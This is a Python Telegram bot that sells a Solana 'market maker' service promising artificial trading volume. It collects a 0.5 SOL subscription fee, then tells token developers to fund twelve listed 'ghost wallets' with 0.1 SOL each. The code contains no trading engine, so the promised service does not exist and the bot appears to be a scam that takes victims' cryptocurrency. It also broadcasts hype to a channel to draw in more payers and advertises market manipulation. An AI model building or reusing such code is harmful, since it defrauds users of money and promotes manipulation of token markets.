import os, asyncio, httpx, json
from aiogram import Bot, Dispatcher, types, F
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv

load_dotenv()

# --- CONFIG ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
SOL_SAFETY = os.getenv("SOL_MAIN")
VIP_CHANNEL = os.getenv("VIP_CHANNEL_ID")
HELIUS_KEY = os.getenv("HELIUS_API_KEY")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Load the 12 Ghost Wallets you generated
try:
    with open("ghost_wallets.json", "r") as f:
        GHOST_ARMY = json.load(f)
except:
    GHOST_ARMY = []

# --- 1. PAYMENT VERIFIER ---
async def verify_payment(sig):
    url = f"https://api.helius.xyz/v0/transactions/?api-key={HELIUS_KEY}"
    async with httpx.AsyncClient() as client:
        try:
            res = await client.post(url, json={"transactions": [sig]})
            data = res.json()
            for tx in data:
                for transfer in tx.get('nativeTransfers', []):
                    # Check if they paid 0.5 SOL
                    if transfer['toUserAccount'] == SOL_SAFETY and transfer['amount'] >= 500000000:
                        return True
            return False
        except: return False

# --- 2. COMMANDS ---
@dp.message(F.text == "/start")
async def start(m: types.Message):
    await m.answer(
        "🧊 **ICE GODS V60: SUPREME WEAPON**\n\n"
        "To activate **Market Maker Mode** (Green Candles), you must subscribe.\n\n"
        "📍 **Price:** 0.5 SOL\n"
        f"📍 **Address:** `{SOL_SAFETY}`\n\n"
        "After payment, use: `/verify [TX_ID]`",
        parse_mode="Markdown"
    )

@dp.message(F.text.startswith("/verify"))
async def handle_verify(m: types.Message):
    sig = m.text.replace("/verify", "").strip()
    if not sig: return await m.answer("❌ Send signature: /verify [TX_ID]")
    
    await m.answer("🕵️ **VERIFYING 0.5 SOL PAYMENT...**")
    if await verify_payment(sig):
        await m.answer(
            "✅ **PAYMENT VERIFIED.**\n\n"
            "WEAPON STATUS: **ARMED**\n"
            "Please drop the **Token CA** you want to boost now.",
            parse_mode="Markdown"
        )
    else:
        await m.answer("❌ Payment not found. Ensure you sent 0.5 SOL to the Treasury.")

@dp.message()
async def handle_ca_and_funding(m: types.Message):
    ca = m.text.strip()
    if not (32 <= len(ca) <= 44): return

    # Verify CA via Helius
    await m.answer(f"⚡ **SCANNING TOKEN ROOT...**")
    try:
        url = f"https://api.helius.xyz/v0/assets/{ca}?api-key={HELIUS_KEY}"
        async with httpx.AsyncClient() as client:
            res = await client.get(url)
            data = res.json()
            name = data.get('content', {}).get('metadata', {}).get('name', 'Unknown')
            
            # Create the list of 12 wallets to show the Dev
            wallet_list = "\n".join([f"`{w['public_key']}`" for w in GHOST_ARMY])
            
            response = (
                f"🧊 **TOKEN DETECTED:** {name}\n\n"
                f"To ignite **Green Candles**, fund these 12 Tactical Wallets with **0.1 SOL each** for gas/trading:\n\n"
                f"{wallet_list}\n\n"
                "🚀 The V60 Engine will start automatically once funding is detected."
            )
            await m.answer(response, parse_mode="Markdown")
            
            # Notify your channel so people see a Dev is about to boost!
            await bot.send_message(VIP_CHANNEL, f"📢 **PREPARING INJECTION:** {name} is being armed for Volume.")
            
    except:
        await m.answer("❌ CA not found. Ensure it is a valid Solana address.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
